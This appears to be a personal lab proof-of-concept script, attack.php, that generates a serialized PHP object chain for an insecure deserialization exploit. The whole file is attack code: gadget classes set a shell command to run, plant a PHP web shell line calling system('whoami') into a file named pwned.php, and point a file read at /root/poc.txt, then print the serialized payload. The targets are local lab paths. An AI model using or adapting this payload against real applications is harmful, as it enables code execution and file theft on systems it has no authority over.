<?php
//attack.php by setting the changing the desired filename to read using the PHP objects and then run the object 
//against the exploit.sh to read the contents of the file using magic methods

class pwned
{
    public function __construct()
    {
        $this->command = 'touch /mnt/d/wsl/PHP/Deserialization/result.txt';
    }

}



class LogFile
{
    public function __construct()
    {
        $this->filename = '/mnt/d/wsl/PHP/Deserialization/pwned.php';
        $this->username = '<?php system("whoami"); ?>'; 
    }
}
class ReadFile
{
    public function __construct()
    {
        $this->filename = '/root/poc.txt';
        $this->secret = new pwned();
    }
}
class User
{
    public function __construct()
    {
        //Fast Destruct
        $this->username = new ReadFile();
        $this->isAdmin = False;

    }
}

$obj = new User();
echo serialize($obj);
echo "\n";


?>